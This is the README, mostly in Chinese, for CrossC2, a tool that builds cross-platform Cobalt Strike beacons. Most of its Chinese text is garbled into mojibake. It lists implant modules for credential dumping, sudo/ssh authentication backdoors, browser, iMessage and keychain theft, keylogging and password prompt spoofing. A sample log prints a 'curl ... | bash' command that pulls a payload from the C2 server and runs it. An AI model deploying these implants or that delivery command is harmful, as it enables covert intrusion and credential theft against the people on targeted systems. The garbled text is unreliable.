# CrossC2 framework

[README](README.md) | [ä¸­æ–‡æ–‡æ¡£](README_zh.md)

ğŸš€ æ›´å¿«æ·çš„ç”Ÿæˆæ–¹å¼ï¼Œå‚è§ **cna** ä»‹ç» [GOğŸ“Œ](#cnaæ’ä»¶æ–¹å¼)

ğŸ”¥ **Linux** & **MacOS** æ”¯æŒæ— æ–‡ä»¶è½åœ°ä»å†…å­˜ä¸­åŠ è½½æ‰§è¡Œ **åŠ¨æ€åº“** æˆ– **å¯æ‰§è¡Œæ–‡ä»¶** [GOğŸ“–](https://gloxec.github.io/CrossC2/zh_cn/api/)

ğŸ”¥ çµæ´»è‡ªå®šä¹‰æ‰§è¡Œæ–‡ä»¶çš„æ•°æ®è¿”å›ç±»å‹ï¼Œ**ç«¯å£æ‰«æ**, **å±å¹•æˆªå›¾**, **é”®ç›˜è®°å½•**, **å£ä»¤å‡­è¯** ç­‰ç”¨æˆ·è‡ªå®šä¹‰å¼€å‘å®ç°æ›´ä¾¿æ· [GOğŸ“–](https://gloxec.github.io/CrossC2/zh_cn/api/commons.html)    ( [æ ·ä¾‹: GOğŸ“Œ](#CustomExtension) )

ğŸ”¥ è‡ªå®šä¹‰é€šä¿¡åè®® [GOğŸ“–](https://gloxec.github.io/CrossC2/zh_cn/protocol/)

ğŸ‰ **Android** & **iPhone** æ”¯æŒ [GOğŸ“Œ](#Mobile)


# CrossC2 framework - ç”ŸæˆCobaltStrikeçš„è·¨å¹³å°beacon

```
     â–„â–ˆâ–ˆâ–ˆâ–ˆâ–„   â–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆ   â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ     â–„â–ˆâ–ˆâ–ˆâ–ˆâ–„   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„ 
    â–’â–ˆâ–ˆâ–€ â–€â–ˆ  â–“â–ˆâ–ˆ â–’ â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’â–’â–ˆâ–ˆ    â–’ â–’â–ˆâ–ˆ    â–’    â–’â–ˆâ–ˆâ–€ â–€â–ˆ        â–ˆâ–ˆâ–‘
    â–’â–“â–ˆ    â–„ â–“â–ˆâ–ˆ â–‘â–„â–ˆ â–’â–’â–ˆâ–ˆâ–‘  â–ˆâ–ˆâ–’â–‘ â–“â–ˆâ–ˆâ–„   â–‘ â–“â–ˆâ–ˆâ–„      â–’â–“â–ˆ        â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’ 
    â–’â–“â–“â–„ â–„â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–€â–€â–ˆâ–„  â–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘  â–’   â–ˆâ–ˆâ–’  â–’   â–ˆâ–ˆâ–’   â–’â–“â–“â–„ â–„â–ˆ â–‘â–’â–ˆâ–ˆ      
    â–’ â–“â–ˆâ–ˆâ–ˆâ–€ â–‘â–‘â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–’â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’   â–’ â–“â–ˆâ–ˆâ–ˆâ–€  â–‘â–’â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“
    â–‘ â–‘â–’ â–’  â–‘â–‘ â–’â–“ â–‘â–’â–“â–‘â–‘ â–’â–‘â–’â–‘â–’â–‘ â–’ â–’â–“â–’ â–’ â–‘â–’ â–’â–“â–’ â–’ â–‘   â–‘ â–‘â–’ â–’    â–‘â–’ â–‘â–“ â–‘â–‘
      â–‘  â–’     â–‘â–’ â–‘ â–’â–‘  â–‘ â–’ â–’â–‘ â–‘ â–‘â–’  â–‘ â–‘â–‘ â–‘â–’  â–‘ â–‘     â–‘  â–’     â–‘ â–‘â–‘ â–‘ 
    â–‘          â–‘â–‘   â–‘ â–‘ â–‘ â–‘ â–’  â–‘  â–‘  â–‘  â–‘  â–‘  â–‘     â–‘         by:â–‘hook
    â–‘ â–‘         â–‘         â–‘ â–‘        â–‘        â–‘     â–‘ â–‘          â–‘    
    â–‘                                               â–‘                 
              
```

![](media/15794884596715/15794993795360.jpg)
![](media/15848885324084/15848892759774.jpg)


# Description

é¢å‘ä¼ä¸šè‡ªèº«åŠçº¢é˜Ÿäººå‘˜çš„å®‰å…¨è¯„ä¼°æ¡†æ¶ï¼Œæ”¯æŒCobaltStrikeå¯¹å…¶ä»–å¹³å°(Linux/MacOS/...)çš„å®‰å…¨è¯„ä¼°ï¼Œæ”¯æŒè‡ªå®šä¹‰æ¨¡å—ï¼ŒåŠåŒ…å«ä¸€äº›å¸¸ç”¨çš„æ¸—é€æ¨¡å—ã€‚

`ä»…åšä¼ä¸šã€ç»„ç»‡å†…éƒ¨è‡ªèº«ä½¿ç”¨ï¼Œæœ¬æ¡†æ¶å…·æœ‰ä¸€å®šè„†å¼±æ€§ï¼Œéä¸“ä¸šäººå‘˜è¯·å‹¿ä½¿ç”¨ï¼Œä»¥åŠç¦æ­¢ç”¨äºéæ³•ç”¨é€”åŠç›ˆåˆ©ç­‰ï¼Œå¦åˆ™é€ æˆç»æµæŸå¤±ç­‰é—®é¢˜è‡ªè¡Œæ‰¿æ‹…å¹¶è¿½ç©¶å…¶ç›¸å…³è´£ä»»!`


|  | Windows | Linux | MacOS | iOS | Android | Embedded |
| --- | --- | --- | --- | --- | --- | --- |
| Run Env (x86) |  | âˆš |  |  |  |  |
| Run Env (x64) | âˆš | âˆš | âˆš |  |  |  |
| gen beacon (x86) |  | âˆš |  |  | âˆš |  |
| gen beacon (x64) |  | âˆš | âˆš |  |  |  |
| gen beacon (armv7) |  |  |  | â»  | âˆš |  |
| gen beacon (arm64) |  |  |  | âˆš | âˆš |  |
| gen beacon (mips[el]) |  |  |  |  |  | â» |

å—é™è¯´æ˜:
* CobaltStrike: æš‚æ—¶ä»…æ”¯æŒ3.14æœ€åä¸€ä¸ªç‰ˆæœ¬(bug fixs).
* Linux: ç‰¹åˆ«è€æ—§çš„ç³»ç»Ÿå¯ä»¥é€‰æ‹©cnaä¸­çš„"Linux-GLIBC"é€‰é¡¹ï¼ˆ2010å¹´å·¦å³ï¼‰
* MacOS: æ–°ç³»ç»Ÿä»…æ”¯æŒ64ä½ç¨‹åº
* iOS: sandbox 
* Embedded: only *nix
* â» : åŠ è½½è¿˜åœ¨å®Œå–„ä¸­

# Install & Usage

> ä¸‹è½½åŸºç¡€æ–‡ä»¶:

* **CrossC2.cna**
* **genCrossC2** `(If it is a Windows system, download genCrossC2.Win.exe)`

1. é€‰æ‹©`Script Manager`ï¼Œæ·»åŠ `CrossC2.cna` (å¦‚æœæˆåŠŸå®‰è£…ï¼Œèœå•æ ä¼šå¤šå‡ºä¸€é¡¹ `CrossC2`)
2. ä¿®æ”¹`CrossC2.cna`è„šæœ¬ä¸­`genCC2`è·¯å¾„ä¸º**çœŸå®è·¯å¾„**

```
77:    $genCC2 = "/xxx/xx/xx/genCrossC2.MacOS";  # <-------- fix
```

> å»ºç«‹listenerä¸æ‹·è´key:

å› ä¸ºä¸€äº›åŸå› ï¼Œç›®å‰å¼ºåˆ¶åªæ”¯æŒHTTPS beaconã€‚

**å¤åˆ¶serverä¸Šcsç›®å½•ä¸‹çš„ `.cobaltstrike.beacon_keys`åˆ°æœ¬åœ°ç›®å½•ä¸‹**


## å®‰è£…å‚è€ƒæ–‡æ¡£: [ğŸ“– Wiki](https://gloxec.github.io/CrossC2/zh_cn/usage/)

## è‡ªå®šä¹‰æ¨¡å—: APIä»‹ç» [ğŸ“– Wiki](https://gloxec.github.io/CrossC2/zh_cn/api/)

é‡‡ç”¨å†…å­˜æ— è½åœ°åŠ è½½æ–¹å¼ï¼Œæ”¯æŒåŠ¨æ€åº“(.so/.dylib)ä»¥åŠå¯æ‰§è¡Œæ–‡ä»¶(ELF/MachO)ã€‚
`âš ï¸: è™½ç„¶æ–‡ä»¶æ˜¯ç›´æ¥ä»å†…å­˜åŠ è½½çš„ï¼Œä½†é€‰ç”¨å¯æ‰§è¡Œæ–‡ä»¶çš„æ–¹å¼åœ¨ä¼ å…¥å‚æ•°æ—¶ï¼Œè¿›ç¨‹æ˜¯å¯ä»¥åœ¨psä¸­æŸ¥çœ‹åˆ°çš„ï¼Œä¸è¿‡è¿›ç¨‹åå¯ä»¥è‡ªå®šä¹‰ã€‚`

æ‰§è¡Œæ—¶è¾“å‡ºä¿¡æ¯çš„ç±»å‹å¯ä»¥è‡ªç”±æŒ‡å®šï¼Œå·²é¢„å®šäº†è¿”å›ç±»å‹ï¼Œå¯å¯¹æ¥CSåŸç”Ÿçš„è¿”å›æ•°æ®ç±»å‹ã€‚
`âš ï¸: å…³äºç‰¹æ®Šçš„æ•°æ®ç±»å‹ï¼Œå¦‚å¯†ç ï¼Œç«¯å£æ‰«æç»“æœç­‰ï¼Œè¯·å‚ç…§csåŸç”ŸåŠŸèƒ½è¿”å›çš„ä¿¡æ¯ç¼–å†™ï¼Œå°†æŒ‰ç…§æ­£åˆ™åŒ¹é…ã€‚`

1. å¯†ç dumpæ¨¡å—ï¼šcc2_mimipenguin é‡‡ç”¨å¼€æºé¡¹ç›® MimiPenguin2.0ï¼Œå‚è§ 
2. CrossC2Kit/mimipenguin/mimipenguin.cna
3. è®¤è¯åé—¨æ¨¡å—ï¼šcc2_auth, cc2_ssh sudo/su/passwdç­‰è®¤è¯åé—¨ï¼Œsshè¢«è¿æ¥åŠè¿æ¥å…¶ä»–ä¸»æœºçš„å‡­è¯éƒ½å°†è¢«è®°å½•ã€‚
4. ä¿¡æ¯æ”¶é›†æ¨¡å—ï¼šcc2_safari_dump, cc2_chrome_dump, cc2_iMessage_dump, cc2_keychain_dump å¸¸è§æµè§ˆå™¨çš„è®¿é—®è®°å½•ï¼Œä»¥åŠiMessageèŠå¤©å†…å®¹ä¸é’¥åŒ™ä¸²ä¸­ä¿å­˜çš„è®¤è¯å‡­æ®éƒ½å°†è¢«è·å–ã€‚
5. æµé‡ä»£ç†æ¨¡å—ï¼šcc2_frp æ”¯æŒå¿«é€ŸTCP/KCP(UDP)çš„åå‘socks5åŠ å¯†æµé‡ä»£ç†ã€‚
6. é”®ç›˜è®°å½•æ¨¡å—ï¼šcc2_keylogger è®°å½•ç”¨æˆ·çš„é”®ç›˜è¾“å…¥ã€‚
7. ç½‘ç»œæ¢æµ‹æ¨¡å—ï¼šcc2_portscan, cc2_serverscan è¿›è¡Œç«¯å£æ‰«æåŠæœåŠ¡ç‰ˆæœ¬æ‰«æã€‚
8. æƒé™æå‡æ¨¡å—ï¼šcc2_prompt_spoof è¯±å¯¼æ¬ºéª—è·å–ç”¨æˆ·è´¦æˆ·å¯†ç ã€‚
9. ä»»åŠ¡ç®¡ç†æ¨¡å—ï¼šcc2_job ç®¡ç†å†…å­˜ä¸­è¿è¡Œçš„æ¨¡å—ã€‚
10. ...


## è‡ªå®šä¹‰é€šä¿¡åè®®: APIä»‹ç» [ğŸ“– Wiki](https://gloxec.github.io/CrossC2/zh_cn/protocol/)

å¯ä»¥æ›´ä¾¿æ·çš„å®ç°C2Profileé…ç½®åŠè‡ªå®šä¹‰é€šä¿¡åè®®TCP/UDPç­‰ç­‰ã€‚ 

## cnaæ’ä»¶æ–¹å¼

```
èœå•æ : CrossC2 -> CrossC2 Payload Generator -> genCrossC2

å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­å¯ä»¥é…ç½®:
1. é€‰æ‹©beacon_key(è·¯å¾„ä¸­ä¸å¯ä»¥åŒ…å«ç©ºæ ¼ï¼Œè¯¥é—®é¢˜æš‚æ—¶æœªè§£å†³)
2. éœ€è¦ç»™beaconç»‘å®šçš„è‡ªå®šä¹‰é€šä¿¡åè®®åŠ¨æ€åº“
3. Payloadç±»å‹(Stagedç”Ÿæˆçš„shellcodeéœ€è¦stagerServer)
```

![](media/15901534124389/15901617930412.jpg)

ç”Ÿæˆæ—¶ä¿¡æ¯çŠ¶æ€ä¼šåœ¨eventç•Œé¢ä¸­æç¤º

```
05/01 23:31:03 *** /mnt/cc2/genCrossC2.MacOS 172.16.251.1 5555 /tmp/beacon_keys null MacOS x64 /tmp/CrossC2-test
05/01 23:31:06 *** genCrossC2 beacon -> *[success] :	Packed 1532232 byte.
05/01 23:31:07 *** hook hosted CrossC2 beacon MacOS x64 @ http://172.16.251.1:55413/iqEBVKwHoZ
05/01 23:31:07 *** hook hosted Script Unix Web Delivery (curl) @ http://172.16.251.1:55413/a
05/01 23:31:07 *** CrossC2 MacOS x64:   curl -A o -o- -L http://172.16.251.1:55413/a | bash -s
```


# å³å°†ä¸Šçº¿

1. ä¸°å¯Œçš„C2Profileæ”¯æŒ âœ”ï¸ (cnaç”Ÿæˆbeaocnæ—¶é€‰æ‹©è‡ªå®šä¹‰HTTPæ¨¡å—)
2. Stagedç±»å‹Shellcodeç”Ÿæˆ âœ”ï¸ (æš‚æ—¶åªæ”¯æŒLinuxï¼Œå¹¶ä¸”éœ€è¦åœ¨serveræœåŠ¡å™¨ä¸Šå¯åŠ¨stagerServer)
3. http-proxy (auth) & socks ä»£ç†å›è¿æ”¯æŒ
4. æµé‡ä¸­è½¬æ”¯æŒ âœ”ï¸ (æš‚æ—¶é‡‡ç”¨å›è¿socksä»£ç†çš„æ–¹å¼)
5. node beacon? (å•ä¸ªèŠ‚ç‚¹å¼ï¼Œå¯è¿›è¡Œä¸ä¾é teamserveræ‰˜ç®¡å…¶ä»–beacon)

# Examples

## Mobile
![](media/15848885324084/15848892759774.jpg)

![](media/15848885324084/15848892902723.jpg)

## MacOS & Linux

![](media/15794884596715/15795001494711.jpg)
![](media/15824278372797/15824282351545.jpg)

## CustomExtension

å¼€å‘åŠ¨æ€åº“ï¼Œè‡ªå®šä¹‰æ•°æ®è¿”å›ç±»å‹ï¼Œä¾‹å¦‚å®ç°ä¸€äº›å†…ç½®åŠŸèƒ½ã€‚

### é”®ç›˜è®°å½•
![](media/15854585486601/15854592406527.jpg)

### å£ä»¤å‡­è¯
![](media/15854585486601/15854601104042.jpg)

### ç«¯å£æ‰«æ
![](media/15854585486601/15854593957704.jpg)

# ChangeLog

## release v1.3 :

* +æ”¯æŒ æ”¯æŒè‡ªå®šä¹‰é€šä¿¡åè®® (HTTP, TCP, UDP...) .
* +æ”¯æŒ æ–°æ·»åŠ äº†joblistæ¨¡å—ï¼Œå¯ç”¨æ¥ç®¡ç†å†…å­˜ä¸­æŒç»­è¿è¡Œçš„æ¨¡å—.
* +æ”¯æŒ æ·»åŠ äº†åå‘ä»£ç†æ¨¡å—{TCP/KCP(UDP)}ï¼ŒåŒæ ·å±äºå†…å­˜æ— è½åœ°è¿è¡Œ.


md5(genCrossC2.Linux) = 221b3ede4e78fee80f59946f116d7245

md5(genCrossC2.MacOS) = d216cad3fe3c25ead46b85c7ad7051f1

md5(genCrossC2.Win.exe) = a573506e8825b46b041ac3b9307a656b

## release v1.2 :

* +æ”¯æŒ å¯ä»¥æ”¯æŒé€‰æ‹©ç”Ÿæˆbeaconæ—¶æ‰€éœ€çš„keyæ–‡ä»¶.
* +æ”¯æŒ æ”¯æŒç”Ÿæˆshellcode.
* -å˜æ›´ ä¸å†ä¾èµ–cobaltstrike.jar (æ„å‘³ç€CrossC2æ’ä»¶å¯ä»¥æ”¾åœ¨ä»»æ„ä½ç½®).
* -å˜æ›´ æ›´åŠ ä¾¿æ·çš„Unixç³»ç»Ÿä¸Šçº¿æ–¹å¼.

md5(genCrossC2.Linux) = 2ef7250cc3787d3cbd1e6f99c3c434aa

md5(genCrossC2.MacOS) = eaabde94dd7fed8dabb37cd67a1171c4

md5(genCrossC2.Win.exe) = c65ac808ed3a1000b3ff4ebb8c48ea4e

## release v1.1 :

* -ä¿®å¤ å†…å­˜åŠ è½½æ‰§è¡ŒåŠŸèƒ½çš„å¤šå›½è¯­è¨€ä¹±ç é—®é¢˜ä¿®å¤

md5(genCrossC2.Linux) = 2347ed6e30e4655b793a6dbb4d33d25c

md5(genCrossC2.MacOS) = f530333500a76fe228864f8901af4104

md5(genCrossC2.Win.exe) = c223e31b2674a8a11d3254f92259e87a

## release v1.0 :

* -ä¿®å¤ çœŸå®ç¯å¢ƒä¸­å¤šç§åœºæ™¯ä¸‹é•¿æ—¶é—´å¤šæ¬¡æµ‹è¯•ï¼Œä¿®å¤ä¸€äº›éšè—çš„é—®é¢˜ï¼Œç°åœ¨æ›´åŠ ç¨³å®š
* +æ”¯æŒ Linux & MacOS æ”¯æŒæ— æ–‡ä»¶å†…å­˜åŠ è½½æ‰§è¡Œ
* +æ”¯æŒ é¢„ç•™CSå†…ç½®æ•°æ®ç±»å‹ï¼Œæ›´åŠ ä¸°å¯Œçš„ç”¨æˆ·è‡ªå®šä¹‰æ’ä»¶è¿”å›æ•°æ®ç±»å‹ï¼Œå¯è‡ªç”±ä¾¿æ·å®ç°'portscan'ç­‰ç­‰åŸç”ŸåŠŸèƒ½

md5(genCrossC2.Linux) = 12295998d4bffd5b4c4a411fb33428bb

md5(genCrossC2.MacOS) = c88ce9df47529b243e2215a866d445c5

md5(genCrossC2.Win.exe) = 51d1814f1ebbab634bce0373ceb7cee6

## release v0.4 :

* -å˜æ›´ shellå‘½ä»¤æ‰§è¡Œæ—¶é‡‡ç”¨åå°å¤šçº¿ç¨‹æ–¹å¼
* -å˜æ›´ shellå‘½ä»¤æ‰§è¡Œæ—¶é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º
* +æ”¯æŒ å¢åŠ åå°æ–‡ä»¶ä¸‹è½½åŠŸèƒ½

md5(genCrossC2.Linux) = b2e34f721ec2543b6625e33c8c2935df

md5(genCrossC2.MacOS) = 4e38a9d9a3eeff309648afc02e2e7664

## release v0.3 :

* +æ”¯æŒ è€ç³»ç»ŸLinuxä¸Šä½ç‰ˆæœ¬GLIBCçš„å…¼å®¹ (2010å¹´å·¦å³)

## release v0.2 : 

* -ä¿®å¤ Linux genCrossC2.Linux å´©æºƒçš„bug.
* -ä¿®å¤ å¤§æ–‡ä»¶ä¸Šä¼ æ—¶æœ«å°¾å­—èŠ‚å†™å…¥ä¸å…¨çš„bug.
* +æ”¯æŒ GUIçš„æ–‡ä»¶ç®¡ç†å™¨.

md5(genCrossC2.Linux) = 8256374d88c2149efc102aff7e90b3f9

md5(genCrossC2.MacOS) = 08fce0a5d964a091d8bf2344d7ab809e

## release v0.1 : 

* æ”¯æŒ ç”Ÿæˆ Linux & MacOS beacon.

md5(genCrossC2.Linux) = f4c0cc85c7cdd096d2b7febedc037538

md5(genCrossC2.MacOS) = 79fff0505092fc2055824ed1289ce8f9









